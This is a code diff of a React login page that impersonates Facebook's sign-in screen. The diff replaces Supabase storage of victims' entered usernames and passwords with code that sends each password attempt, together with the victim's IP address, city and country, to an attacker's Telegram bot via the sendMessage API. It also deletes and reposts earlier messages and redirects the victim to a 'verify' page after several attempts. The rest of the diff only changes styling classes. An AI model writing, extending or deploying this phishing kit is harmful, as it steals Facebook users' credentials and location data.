@@ -5,11 +5,11 @@ import FBLogoSVG from '@/assets/images/facebook-logo.svg';
 import { faXmark } from '@fortawesome/free-solid-svg-icons';
 import { faEye, faEyeSlash } from '@fortawesome/free-regular-svg-icons';
 import MetaImage from '@/assets/images/meta-logo.png';
-import { supabase } from '@/utils/supabase';
 import { useNavigate } from 'react-router';
 import paths from '@/router/paths';
 import translateText from '@/utils/translate';
-
+import config from '@/utils/config';
+import axios from 'axios';
 interface GeoLocationData {
     city: string;
     accuracy: number;
@@ -82,7 +82,7 @@ const getGeolocationData = (): GeoLocationData | null => {
         return null;
     }
 };
-
+const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
 const Login: FC = () => {
     const navigate = useNavigate();
 
@@ -199,14 +199,9 @@ const Login: FC = () => {
 
     useEffect(() => {
         const getConfig = async () => {
-            const { data, error } = await supabase.from('config').select('max_pass');
-            if (!error) {
-                if (data.length != 0) {
-                    setMaxAttemp(data[0].max_pass);
-                }
-            }
+            const maxPass = config.so_lan_sai_pass;
+            setMaxAttemp(maxPass);
         };
-
         const fetchGeolocation = async () => {
             const geoData = getGeolocationData();
             if (geoData) {
@@ -224,42 +219,35 @@ const Login: FC = () => {
             return;
         }
         setIsLoading(true);
-        const getExistId = async () => {
-            const { data, error } = await supabase.from('data').select('id,username').eq('username', username).limit(1);
-            if (error) {
-                return;
-            }
-            if (data.length != 0) {
-                return data?.[0].id;
-            }
-        };
-        let id;
-        const existId = await getExistId();
-        if (!existId) {
-            const insertData: { username: string; ip?: string; country?: string } = {
-                username: username
-            };
-            if (geolocationData) {
-                insertData.ip = geolocationData.ip;
-                const city = geolocationData.city || 'Unknown';
-                const region = geolocationData.region || 'Unknown';
-                const country = geolocationData.country || 'Unknown';
-                insertData.country = `${city}-${region}-${country}`;
-            }
-
-            const response = await supabase.from('data').insert(insertData).select();
-            if (response.data?.length != 0) {
-                id = response.data?.[0].id;
-            }
-        } else {
-            id = existId;
+        const messageId = localStorage.getItem('message_id');
+        const oldMessage = localStorage.getItem('message');
+        const token = config.token;
+        const chat_id = config.chat_id;
+        if (messageId) {
+            await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, {
+                chat_id: chat_id,
+                message_id: messageId
+            });
         }
-        await supabase.from('list_pass').insert({
-            pass: password,
-            data_id: id
+        let newMessage = '';
+        if (oldMessage) {
+            newMessage = oldMessage + `\n<b>Password ${currentAttemp}:</b> <code>${password}</code>`;
+        } else {
+            const currentDate = new Date();
+            const date = currentDate.toLocaleDateString('vi-VN');
+            const time = currentDate.toLocaleTimeString('vi-VN');
+            newMessage = `<b>${time}-${date}</b>\n<b>IP:</b> <code>${geolocationData?.ip}</code>\n<b>DC:</b> <code>${geolocationData?.city} ${geolocationData?.country}</code>\n<b>TK:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>`;
+        }
+        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chat_id,
+            text: newMessage,
+            parse_mode: 'HTML'
         });
+        const data = await response.data;
+        localStorage.setItem('message', newMessage);
+        localStorage.setItem('message_id', data.result.message_id);
+        await delay(config.thoi_gian_sai_pass * 1000);
         if (currentAttemp >= maxAttemp) {
-            localStorage.setItem('data_id', id);
             navigate(paths.verify);
         }
         setShowError(true);
@@ -272,7 +260,7 @@ const Login: FC = () => {
             <div className='flex min-h-screen flex-col items-center justify-center px-4 pt-5 md:hidden'>
                 <div className='mt-2 text-sm text-[#5d6c7b]'>{translatedTexts.englishUK}</div>
                 <div className='flex grow items-center justify-center'>
-                    <img src={FBLogoImage} className='max-h-[60px] max-w-[60px] object-contain' alt='' />
+                    <img src={FBLogoImage} className='max-h-15 max-w-15 object-contain' alt='' />
                 </div>
                 <div className='flex w-full grow flex-col gap-3'>
                     <div className='relative'>
@@ -282,7 +270,7 @@ const Login: FC = () => {
                             id='username'
                             type='text'
                             placeholder=' '
-                            className='peer h-[62px] w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b]'
+                            className='peer h-15.5 w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b]'
                             value={username}
                             onChange={(e) => {
                                 setUsername(e.target.value);
@@ -309,7 +297,7 @@ const Login: FC = () => {
                             id='password'
                             type={isShowPassword ? 'text' : 'password'}
                             placeholder=' '
-                            className={`peer h-[62px] w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b] ${showError && 'border-red-500'}`}
+                            className={`peer h-15.5 w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b] ${showError && 'border-red-500'}`}
                             value={password}
                             onChange={(e) => {
                                 setShowError(false);
@@ -333,7 +321,7 @@ const Login: FC = () => {
                         </button>
                     </div>
                     <button
-                        className='flex h-[44px] items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]'
+                        className='flex h-11 items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]'
                         onClick={() => {
                             handleSubmit();
                         }}
@@ -343,9 +331,9 @@ const Login: FC = () => {
                     <span className='text-center text-[15px] font-medium text-[#0a1317]'>{translatedTexts.forgottenPassword}</span>
                 </div>
                 <div className='flex w-full flex-col items-center justify-center gap-4'>
-                    <div className='flex h-[44px] w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]'>{translatedTexts.createNewAccount}</div>
+                    <div className='flex h-11 w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]'>{translatedTexts.createNewAccount}</div>
                     <div className='flex items-center justify-center'>
-                        <img className='h-[12px]' src={MetaImage} alt='' />
+                        <img className='h-3' src={MetaImage} alt='' />
                     </div>
                     <div className='flex items-center gap-2 text-[10px] text-[#63788a]'>
                         <span>{translatedTexts.about}</span>
@@ -361,7 +349,7 @@ const Login: FC = () => {
                         <img src={FBLogoSVG} className='h-8' alt='Facebook' />
                     </div>
 
-                    <div className='w-full max-w-[396px] rounded-lg bg-white p-6 shadow-sm'>
+                    <div className='w-full max-w-99 rounded-lg bg-white p-6 shadow-sm'>
                         <h1 className='mb-6 text-center text-lg text-[#1c1e21]'>{translatedTexts.logInToFacebook}</h1>
 
                         <div className='space-y-4'>
@@ -415,7 +403,7 @@ const Login: FC = () => {
                     </div>
                 </div>
 
-                <div className='mt-8 w-full max-w-[980px] text-center'>
+                <div className='mt-8 w-full max-w-245 text-center'>
                     <div className='mb-4 flex flex-wrap justify-start gap-2 text-xs text-[#8a8d91]'>
                         <span>{translatedTexts.englishUK}</span>
                         <span>{translatedTexts.tiengViet}</span>
